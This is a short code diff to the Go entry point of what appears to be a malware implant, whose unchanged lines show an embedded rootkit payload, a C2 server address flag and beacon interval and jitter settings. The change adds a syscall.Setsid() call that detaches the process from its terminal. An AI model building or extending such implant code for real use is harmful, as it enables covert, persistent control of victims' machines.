@@ -7,6 +7,7 @@ import (
 	"math/rand"
 	"net"
 	"os"
+	"syscall"
 	"time"
 
 	"core/mon/internal/config"
@@ -22,6 +23,8 @@ import (
 var rootkitPayload []byte
 
 func main() {
+	syscall.Setsid() //nolint
+
 	serverAddr := flag.String("server", config.DefaultServer, "C2 server address (host:port)")
 	idleInterval := flag.Duration("interval", mustParseDuration(config.DefaultInterval), "idle beacon interval")
 	jitter := flag.Float64("jitter", 0.3, "jitter fraction for idle interval (0.0-1.0)")
